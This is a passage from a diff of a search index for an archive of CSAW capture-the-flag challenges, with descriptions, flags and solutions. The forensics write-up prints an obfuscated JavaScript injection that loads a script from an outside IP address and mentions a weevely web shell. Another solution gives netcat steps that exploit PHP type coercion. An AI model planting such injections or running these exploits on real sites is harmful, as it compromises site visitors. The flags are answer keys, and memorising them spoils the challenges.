i=0;i\nf.length;i++){c+=f[i].length.toString();}v=f[0];x=\n\\\nht\n;b=f[4];f=2541*6-35+46+12-15269;c+=f.toString();f=(56+31+68*65+41-548)/4000-1;c+=f.toString();f=\n;c=c.split(\n);var w=0;u=\ns\n;for(var i=0;i\nc.length;i++){if(((i==3||i==6)\nw!=2)||((i==8)\nw==2)){f+=String.fromCharCode(46);w++;}f+=c[i];} i=k+\nanal\n; document.write(\n+m+\n \n+b+\n=\n+x+\ntp:\n+k+k+f+i+\ny\n+g+\nc\n+u+v+\nj\n+u+\n\\\n\\\n/\n+m+\n\\\n);\n\n\n\n\n\nThis is an obfuscated way to do a script include from \nhttp://128.238.66.100/analytics.js\n\nStudents could notice this, or maybe use developer mode in the browser to see the js include.\nOnce to \nanalytics.js\n, there is more obfuscation its basically two giagantic blocks of dummy code around:\n\n\nvar _0x91fe=[\n\\x68\\x74\\x74\\x70\\x3A\\x2F\\x2F\\x31\\x32\\x38\\x2E\\x32\\x33\\x38\\x2E\\x36\\x36\\x2E\\x31\\x30\\x30\\x2F\\x61\\x6E\\x6E\\x6F\\x75\\x6E\\x63\\x65\\x6D\\x65\\x6E\\x74\\x2E\\x70\\x64\\x66\n,\n\\x5F\\x73\\x65\\x6C\\x66\n,\n\\x6F\\x70\\x65\\x6E\n];window[_0x91fe[2]](_0x91fe[0],_0x91fe[1]);\n\n\n\n\n\nThis opens a new window that renders \nhttp://128.238.66.100/announcement.pdf\n\nI expect that students will either use a user-agent switcher or \nIE9 to get the request for announcement.pdf. I dont know that anyone will deal with the javascript.\nThen the announcement.pdf has a file stream in it, you can\n\n\npdfextract announcement.pdf\ncd announcement.dump/streams\ncat steam_8\n\n\n\n\n\nto see another javascript obfuscated version of:\n\n\nvar key = \nYOU DID IT! CONGRATS! fwiw, javascript obfuscation is sofa king dumb  :) key{Those Fluffy Bunnies Make Tummy Bumpy}\n;\n\n\n\n\n\nSetup", 
+            "title": "Fluffy No More"
+        }, 
+        {
+            "location": "/challenges/2014/forensics/Fluffy_No_More/#fluffy-no-more", 
+            "text": "", 
+            "title": "Fluffy No More"
+        }, 
+        {
+            "location": "/challenges/2014/forensics/Fluffy_No_More/#author", 
+            "text": "Antoniweicz", 
+            "title": "Author"
+        }, 
+        {
+            "location": "/challenges/2014/forensics/Fluffy_No_More/#points", 
+            "text": "300", 
+            "title": "Points"
+        }, 
+        {
+            "location": "/challenges/2014/forensics/Fluffy_No_More/#category", 
+            "text": "Forensics", 
+            "title": "Category"
+        }, 
+        {
+            "location": "/challenges/2014/forensics/Fluffy_No_More/#description", 
+            "text": "\"OH NO WE'VE BEEN HACKED!!!!!! -- said the Eye Heart Fluffy Bunnies Blog owner. Life was grand for the fluff fanatic until one day the site's users started to get attacked! Apparently fluffy bunnies are not just a love of fun furry families but also furtive foreign governments. The notorious \"\"Forgotten Freaks\"\" hacking group was known to be targeting high powered politicians. Were the cute bunnies the next in their long list of conquests!??\nWell... The fluff needs your stuff. I've pulled the logs from the server for you along with a backup of it's database and configuration. Figure out what is going on!\"", 
+            "title": "Description"
+        }, 
+        {
+            "location": "/challenges/2014/forensics/Fluffy_No_More/#flag", 
+            "text": "key{Those Fluffy Bunnies Make Tummy Bumpy}", 
+            "title": "Flag"
+        }, 
+        {
+            "location": "/challenges/2014/forensics/Fluffy_No_More/#solution", 
+            "text": "Within the apache log file (/var/logs/apache2/access.log) is an indicator of attack for the MailPoet vulnerability. Details here:  http://blog.sucuri.net/2014/07/mailpoet-vulnerability-exploited-in-the-wild-breaking-thousands-of-wordpress-sites.html \nI dont expect people to find that really, but maybe they will. The vulnerability is exploited and uploads two files to  /var/www/html/wp-content/uploads/wysija/themes/weblizer  template.php is a weevely shell. There is also a single execution command entry in the access.log of the attacker's modifications to the wordpress install, but people might not notice that either.\nThe attacker modified  /var/www/html/wp-content/themes/twentythirteen/js/html5.js  which only gets rendered if a user is using IE9 or below.  !--[if lt IE 9] \n     script src= http://blog.eyeheartfluffybunnies.com/wp-content/themes/twentythirteen/js/html5.js /script \n     ![endif]--   This is not attacker added code, but naturally occuring. You can see this from the source on the webpage. My expectation is people will actually create a LAMP server to replicate and notice this condition or do a diff of the plugins/themes.\nHowever they get there, they'll hopefully notice that html5.js has a modification:  var g= ti ;var c= HTML Tags ;var f= . li colgroup br src datalist script option . ;f = f.split(   );c= ;k= / ;m=f[6];for(var i=0;i f.length;i++){c+=f[i].length.toString();}v=f[0];x= \\ ht ;b=f[4];f=2541*6-35+46+12-15269;c+=f.toString();f=(56+31+68*65+41-548)/4000-1;c+=f.toString();f= ;c=c.split( );var w=0;u= s ;for(var i=0;i c.length;i++){if(((i==3||i==6) w!=2)||((i==8) w==2)){f+=String.fromCharCode(46);w++;}f+=c[i];} i=k+ anal ; document.write( +m+   +b+ = +x+ tp: +k+k+f+i+ y +g+ c +u+v+ j +u+ \\ \\ / +m+ \\ );  This is an obfuscated way to do a script include from  http://128.238.66.100/analytics.js \nStudents could notice this, or maybe use developer mode in the browser to see the js include.\nOnce to  analytics.js , there is more obfuscation its basically two giagantic blocks of dummy code around:  var _0x91fe=[ \\x68\\x74\\x74\\x70\\x3A\\x2F\\x2F\\x31\\x32\\x38\\x2E\\x32\\x33\\x38\\x2E\\x36\\x36\\x2E\\x31\\x30\\x30\\x2F\\x61\\x6E\\x6E\\x6F\\x75\\x6E\\x63\\x65\\x6D\\x65\\x6E\\x74\\x2E\\x70\\x64\\x66 , \\x5F\\x73\\x65\\x6C\\x66 , \\x6F\\x70\\x65\\x6E ];window[_0x91fe[2]](_0x91fe[0],_0x91fe[1]);  This opens a new window that renders  http://128.238.66.100/announcement.pdf \nI expect that students will either use a user-agent switcher or  IE9 to get the request for announcement.pdf. I dont know that anyone will deal with the javascript.\nThen the announcement.pdf has a file stream in it, you can  pdfextract announcement.pdf\ncd announcement.dump/streams\ncat steam_8  to see another javascript obfuscated version of:  var key =  YOU DID IT! CONGRATS! fwiw, javascript obfuscation is sofa king dumb  :) key{Those Fluffy Bunnies Make Tummy Bumpy} ;", 
+            "title": "Solution"
+        }, 
+        {
+            "location": "/challenges/2014/forensics/Fluffy_No_More/#setup", 
+            "text": "", 
+            "title": "Setup"
+        }, 
+        {
             "location": "/forensics/introduction/", 
             "text": "Forensics", 
             "title": "Introduction"
@@ -3931,6 +6676,271 @@
             "title": "Solution"
         }, 
         {
+            "location": "/challenges/2015/misc/1337/", 
+            "text": "1337\n\n\nAuthor\n\n\nStortz\n\n\nPoints\n\n\n150\n\n\nCategory\n\n\nMisc\n\n\nDescription\n\n\nBring me a receipt with the grand total (items + tax) of $13.37. There are some restrictions:\n- The receipt must be from within 1/2 mile of 6 MetroTech.\n- The receipt must be printed on receipt paper.\n- The receipt must be itemized with each item\u2019s price shown\n- No more than 4 items can be used to equal $13.37.\n- The purchase must be during the hours of the competition.\n- You must show the purchased items to the judges.\n- Tips, discretionary costs, and haggled costs do not count. Ideally every item would have a price sticker on it.\n- Flea Markets are not allowed.\n- Quantities are whole numbers. You can't use something measured by weight or equivalent.\n\n\nFlag\n\n\nSolution\n\n\nSetup", 
+            "title": 1337
+        }, 
+        {
+            "location": "/challenges/2015/misc/1337/#1337", 
+            "text": "", 
+            "title": "1337"
+        }, 
+        {
+            "location": "/challenges/2015/misc/1337/#author", 
+            "text": "Stortz", 
+            "title": "Author"
+        }, 
+        {
+            "location": "/challenges/2015/misc/1337/#points", 
+            "text": "150", 
+            "title": "Points"
+        }, 
+        {
+            "location": "/challenges/2015/misc/1337/#category", 
+            "text": "Misc", 
+            "title": "Category"
+        }, 
+        {
+            "location": "/challenges/2015/misc/1337/#description", 
+            "text": "Bring me a receipt with the grand total (items + tax) of $13.37. There are some restrictions:\n- The receipt must be from within 1/2 mile of 6 MetroTech.\n- The receipt must be printed on receipt paper.\n- The receipt must be itemized with each item\u2019s price shown\n- No more than 4 items can be used to equal $13.37.\n- The purchase must be during the hours of the competition.\n- You must show the purchased items to the judges.\n- Tips, discretionary costs, and haggled costs do not count. Ideally every item would have a price sticker on it.\n- Flea Markets are not allowed.\n- Quantities are whole numbers. You can't use something measured by weight or equivalent.", 
+            "title": "Description"
+        }, 
+        {
+            "location": "/challenges/2015/misc/1337/#flag", 
+            "text": "", 
+            "title": "Flag"
+        }, 
+        {
+            "location": "/challenges/2015/misc/1337/#solution", 
+            "text": "", 
+            "title": "Solution"
+        }, 
+        {
+            "location": "/challenges/2015/misc/1337/#setup", 
+            "text": "", 
+            "title": "Setup"
+        }, 
+        {
+            "location": "/challenges/2015/misc/sanity-check/", 
+            "text": "sanity_check\n\n\nAuthor\n\n\nCrowell\n\n\nPoints\n\n\n100\n\n\nCategory\n\n\nMisc\n\n\nDescription\n\n\nhi there! do you know this usually useless trick? no? well, that's too bad :(\n\n\nFlag\n\n\nSolution\n\n\n\n\nhttps://github.com/aweinstock314/aweinstock-ctf-writeups/blob/master/csaw_finals_2015/trivia100_sanitycheck/trivia100_sanitycheck_exploit.py\n\n\n\n\nSetup\n\n\nlibc.so.6_3f6aaa980b58f7c7590dee12d731e099\n\n\nsanity_check_76955449d82f05cbd7f84fa011da93ce", 
+            "title": "Sanity Check"
+        }, 
+        {
+            "location": "/challenges/2015/misc/sanity-check/#sanity_check", 
+            "text": "", 
+            "title": "sanity_check"
+        }, 
+        {
+            "location": "/challenges/2015/misc/sanity-check/#author", 
+            "text": "Crowell", 
+            "title": "Author"
+        }, 
+        {
+            "location": "/challenges/2015/misc/sanity-check/#points", 
+            "text": "100", 
+            "title": "Points"
+        }, 
+        {
+            "location": "/challenges/2015/misc/sanity-check/#category", 
+            "text": "Misc", 
+            "title": "Category"
+        }, 
+        {
+            "location": "/challenges/2015/misc/sanity-check/#description", 
+            "text": "hi there! do you know this usually useless trick? no? well, that's too bad :(", 
+            "title": "Description"
+        }, 
+        {
+            "location": "/challenges/2015/misc/sanity-check/#flag", 
+            "text": "", 
+            "title": "Flag"
+        }, 
+        {
+            "location": "/challenges/2015/misc/sanity-check/#solution", 
+            "text": "https://github.com/aweinstock314/aweinstock-ctf-writeups/blob/master/csaw_finals_2015/trivia100_sanitycheck/trivia100_sanitycheck_exploit.py", 
+            "title": "Solution"
+        }, 
+        {
+            "location": "/challenges/2015/misc/sanity-check/#setup", 
+            "text": "libc.so.6_3f6aaa980b58f7c7590dee12d731e099  sanity_check_76955449d82f05cbd7f84fa011da93ce", 
+            "title": "Setup"
+        }, 
+        {
+            "location": "/challenges/2015/misc/moar-chess/", 
+            "text": "MOAR CHESS\n\n\nAuthor\n\n\nPoints\n\n\n150\n\n\nDescription\n\n\nPlay a 3v1 chess game against Kevin.\nIf you want to play just let Kevin know. We can set the boards up.\nHere are the rules:\n- The standard rules of chess\n- Kevin plays 3 boards at once against 3 players from a team\n- A team can play at most 3 times an hour but it is still up to Kevin to accept or decline a challenge or even enforce this rule\n- You may not use an engine or other computer support. Only the players sitting at the table may provide moves\n- Kevin has 7 minutes on each board, each competitor has 5 minutes. (To allow time to move between boards)\n- Illegal moves that are called out are considered wins for either side\n- Kevin always plays white\n- The clock confirms the move meaning when you hit the clock you have confirmed your move and it is immutable\n- You must win 2 out of the 3 games.\n\n\nFlag\n\n\nSolution\n\n\nSetup", 
+            "title": "Moar Chess"
+        }, 
+        {
+            "location": "/challenges/2015/misc/moar-chess/#moar-chess", 
+            "text": "", 
+            "title": "MOAR CHESS"
+        }, 
+        {
+            "location": "/challenges/2015/misc/moar-chess/#author", 
+            "text": "", 
+            "title": "Author"
+        }, 
+        {
+            "location": "/challenges/2015/misc/moar-chess/#points", 
+            "text": "150", 
+            "title": "Points"
+        }, 
+        {
+            "location": "/challenges/2015/misc/moar-chess/#description", 
+            "text": "Play a 3v1 chess game against Kevin.\nIf you want to play just let Kevin know. We can set the boards up.\nHere are the rules:\n- The standard rules of chess\n- Kevin plays 3 boards at once against 3 players from a team\n- A team can play at most 3 times an hour but it is still up to Kevin to accept or decline a challenge or even enforce this rule\n- You may not use an engine or other computer support. Only the players sitting at the table may provide moves\n- Kevin has 7 minutes on each board, each competitor has 5 minutes. (To allow time to move between boards)\n- Illegal moves that are called out are considered wins for either side\n- Kevin always plays white\n- The clock confirms the move meaning when you hit the clock you have confirmed your move and it is immutable\n- You must win 2 out of the 3 games.", 
+            "title": "Description"
+        }, 
+        {
+            "location": "/challenges/2015/misc/moar-chess/#flag", 
+            "text": "", 
+            "title": "Flag"
+        }, 
+        {
+            "location": "/challenges/2015/misc/moar-chess/#solution", 
+            "text": "", 
+            "title": "Solution"
+        }, 
+        {
+            "location": "/challenges/2015/misc/moar-chess/#setup", 
+            "text": "", 
+            "title": "Setup"
+        }, 
+        {
+            "location": "/challenges/2015/misc/late-night-smash/", 
+            "text": "Late Night Smash\n\n\nAuthor\n\n\nPoints\n\n\n50\n\n\nCategory\n\n\nMisc\n\n\nDescription\n\n\nBeat Kyle in a standard four stock.\nBest of 1\n\n\nFlag\n\n\nSolution\n\n\nSetup", 
+            "title": "Late Night Smash"
+        }, 
+        {
+            "location": "/challenges/2015/misc/late-night-smash/#late-night-smash", 
+            "text": "", 
+            "title": "Late Night Smash"
+        }, 
+        {
+            "location": "/challenges/2015/misc/late-night-smash/#author", 
+            "text": "", 
+            "title": "Author"
+        }, 
+        {
+            "location": "/challenges/2015/misc/late-night-smash/#points", 
+            "text": "50", 
+            "title": "Points"
+        }, 
+        {
+            "location": "/challenges/2015/misc/late-night-smash/#category", 
+            "text": "Misc", 
+            "title": "Category"
+        }, 
+        {
+            "location": "/challenges/2015/misc/late-night-smash/#description", 
+            "text": "Beat Kyle in a standard four stock.\nBest of 1", 
+            "title": "Description"
+        }, 
+        {
+            "location": "/challenges/2015/misc/late-night-smash/#flag", 
+            "text": "", 
+            "title": "Flag"
+        }, 
+        {
+            "location": "/challenges/2015/misc/late-night-smash/#solution", 
+            "text": "", 
+            "title": "Solution"
+        }, 
+        {
+            "location": "/challenges/2015/misc/late-night-smash/#setup", 
+            "text": "", 
+            "title": "Setup"
+        }, 
+        {
+            "location": "/challenges/2014/misc/Julian/", 
+            "text": "Title\n\n\nAuthor\n\n\nCohen\n\n\nPoints\n\n\n100\n\n\nCategory\n\n\nRecon\n\n\nDescription\n\n\nFigure out how to get Julian to go on a date with you.\n\n\nFlag\n\n\nflag{julian_will_not_date_you_sorry}\n\n\nSolution\n\n\nThis flag will be stored in Julian's newly cleared okcupid profile.\n\nhttp://www.okcupid.com/profile/TheJulianCohen/\n\n\nSetup", 
+            "title": "Julian"
+        }, 
+        {
+            "location": "/challenges/2014/misc/Julian/#title", 
+            "text": "", 
+            "title": "Title"
+        }, 
+        {
+            "location": "/challenges/2014/misc/Julian/#author", 
+            "text": "Cohen", 
+            "title": "Author"
+        }, 
+        {
+            "location": "/challenges/2014/misc/Julian/#points", 
+            "text": "100", 
+            "title": "Points"
+        }, 
+        {
+            "location": "/challenges/2014/misc/Julian/#category", 
+            "text": "Recon", 
+            "title": "Category"
+        }, 
+        {
+            "location": "/challenges/2014/misc/Julian/#description", 
+            "text": "Figure out how to get Julian to go on a date with you.", 
+            "title": "Description"
+        }, 
+        {
+            "location": "/challenges/2014/misc/Julian/#flag", 
+            "text": "flag{julian_will_not_date_you_sorry}", 
+            "title": "Flag"
+        }, 
+        {
+            "location": "/challenges/2014/misc/Julian/#solution", 
+            "text": "This flag will be stored in Julian's newly cleared okcupid profile. http://www.okcupid.com/profile/TheJulianCohen/", 
+            "title": "Solution"
+        }, 
+        {
+            "location": "/challenges/2014/misc/Julian/#setup", 
+            "text": "", 
+            "title": "Setup"
+        }, 
+        {
+            "location": "/challenges/2014/misc/KevinChung/", 
+            "text": "Kevin Chung\n\n\nAuthor\n\n\nChung\n\n\nPoints\n\n\n100\n\n\nCategory\n\n\nRecon\n\n\nDescription\n\n\nFind a picture of me that's from before I was a high school student. Submit the URL to the file on the internet\n\n\nFlag\n\n\nSolution\n\n\nhttp://www.siths.org/album/48915/23451.jpg\n\n\nSetup", 
+            "title": "Kevin Chung"
+        }, 
+        {
+            "location": "/challenges/2014/misc/KevinChung/#kevin-chung", 
+            "text": "", 
+            "title": "Kevin Chung"
+        }, 
+        {
+            "location": "/challenges/2014/misc/KevinChung/#author", 
+            "text": "Chung", 
+            "title": "Author"
+        }, 
+        {
+            "location": "/challenges/2014/misc/KevinChung/#points", 
+            "text": "100", 
+            "title": "Points"
+        }, 
+        {
+            "location": "/challenges/2014/misc/KevinChung/#category", 
+            "text": "Recon", 
+            "title": "Category"
+        }, 
+        {
+            "location": "/challenges/2014/misc/KevinChung/#description", 
+            "text": "Find a picture of me that's from before I was a high school student. Submit the URL to the file on the internet", 
+            "title": "Description"
+        }, 
+        {
+            "location": "/challenges/2014/misc/KevinChung/#flag", 
+            "text": "", 
+            "title": "Flag"
+        }, 
+        {
+            "location": "/challenges/2014/misc/KevinChung/#solution", 
+            "text": "http://www.siths.org/album/48915/23451.jpg", 
+            "title": "Solution"
+        }, 
+        {
+            "location": "/challenges/2014/misc/KevinChung/#setup", 
+            "text": "", 
+            "title": "Setup"
+        }, 
+        {
             "location": "/challenges/2016/misc/regexpire/", 
             "text": "Regexpire\n\n\nAuthor\n\n\nPoints\n\n\n100\n\n\nCategory\n\n\nMisc\n\n\nDescription\n\n\nI thought I found a perfect match but she ended up being my regEx girlfriend.\nNote: You can't use newlines inside your match.\n\n\nFlag:\n\n\nflag{^regularly_express_yourself$}\n\n\nSolution\n\n\nSee \nsolution/", 
             "title": "Regexpire"
@@ -3969,6 +6979,51 @@
             "location": "/challenges/2016/misc/regexpire/#solution", 
             "text": "See  solution/", 
             "title": "Solution"
+        }, 
+        {
+            "location": "/challenges/2014/misc/pps_-_Wiens/", 
+            "text": "PPS\n\n\nAuthor\n\n\nWiens\n\n\nPoints\n\n\n200\n\n\nCategory\n\n\nMisc\n\n\nDescription\n\n\nFlag\n\n\nflag{ConsiderThisPUNishmentEnough}\n\n\nSolution\n\n\n\n\nLeak source\n\n\n\n\nnc localhost 5665\n4\npps.php\n2\n\n\n\n\n\n\n\nLeak flag\nWith the source, find the hidden password, evade the string matching via PHP's awesome forced coersion:\n\n\n\n\nnc localhost 5665\n5\n0xabadfad\nflag\n2\n\n\n\n\n\nSetup\n\n\nJust move the files from deploy somewhere on a filesystem. Preferrably give whatever runs the php no permissions to write anything anywhere. Then launch via xinetd on port 5665 (or whatever).", 
+            "title": "PPS"
+        }, 
+        {
+            "location": "/challenges/2014/misc/pps_-_Wiens/#pps", 
+            "text": "", 
+            "title": "PPS"
+        }, 
+        {
+            "location": "/challenges/2014/misc/pps_-_Wiens/#author", 
+            "text": "Wiens", 
+            "title": "Author"
+        }, 
+        {
+            "location": "/challenges/2014/misc/pps_-_Wiens/#points", 
+            "text": "200", 
+            "title": "Points"
+        }, 
+        {
+            "location": "/challenges/2014/misc/pps_-_Wiens/#category", 
+            "text": "Misc", 
+            "title": "Category"
+        }, 
+        {
+            "location": "/challenges/2014/misc/pps_-_Wiens/#description", 
+            "text": "", 
+            "title": "Description"
+        }, 
+        {
+            "location": "/challenges/2014/misc/pps_-_Wiens/#flag", 
+            "text": "flag{ConsiderThisPUNishmentEnough}", 
+            "title": "Flag"
+        }, 
+        {
+            "location": "/challenges/2014/misc/pps_-_Wiens/#solution", 
+            "text": "Leak source   nc localhost 5665\n4\npps.php\n2   Leak flag\nWith the source, find the hidden password, evade the string matching via PHP's awesome forced coersion:   nc localhost 5665\n5\n0xabadfad\nflag\n2", 
+            "title": "Solution"
+        }, 
+        {
+            "location": "/challenges/2014/misc/pps_-_Wiens/#setup", 
+            "text": "Just move the files from deploy somewhere on a filesystem. Preferrably give whatever runs the php no permissions to write anything anywhere. Then launch via xinetd on port 5665 (or whatever).", 
+            "title": "Setup"
         }, 
         {
             "location": "/challenges/2017/misc/ethersplay/", 
